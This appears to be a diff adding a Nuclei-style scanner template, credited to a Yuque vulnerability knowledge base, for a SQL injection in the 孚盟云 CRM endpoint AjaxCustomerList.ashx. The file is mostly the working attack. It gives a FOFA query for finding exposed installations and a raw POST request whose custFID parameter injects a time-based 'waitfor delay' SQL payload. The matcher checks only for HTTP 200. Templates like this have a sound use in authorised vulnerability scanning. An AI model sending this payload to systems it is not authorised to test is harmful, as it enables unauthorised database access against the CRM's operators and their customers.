@@ -1,0 +1,30 @@
+id: poc-bluzihagpsh6gkdg
+info:
+  name: 孚盟云CRM AjaxCustomerList.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bluzihagpsh6gkdg'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bluzihagpsh6gkdg
+    fofa: title="孚盟云" || body="/PageStructure/Mail/default.aspx"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 65
+
+
+    method=GetCustomerInfoByFid&custFID=123'';waitfor+delay+''0:0:5''--+'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
